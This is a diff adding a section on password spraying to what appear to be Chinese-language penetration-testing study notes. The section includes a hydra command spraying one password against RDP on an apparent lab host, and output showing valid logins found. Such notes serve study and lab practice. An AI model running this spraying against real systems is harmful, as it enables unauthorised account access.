@@ -3142,6 +3142,22 @@ PORT   STATE SERVICE
 ...
 ```
 - password spraying
+Password spraying 是一種暴破手法，攻擊者會對目標系統進行大範圍的嘗試，使用常見的密碼嘗試對多個帳號進行登入，而不是針對單一帳號進行大量嘗試
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ hydra -L /Users/CWei/Tool/dirb/wordlists/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+...
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
+[DATA] attacking rdp://192.168.50.202:3389/
+...
+[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
+[ERROR] freerdp: The connection failed to establish.
+[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
+[ERROR] freerdp: The connection failed to establish.
+...
+```
+> 用有效的使用者密碼 `SuperS3cure1337#`，爆破 RDP 使用者帳戶
 
 
 ### 2. HTTP POST login forms
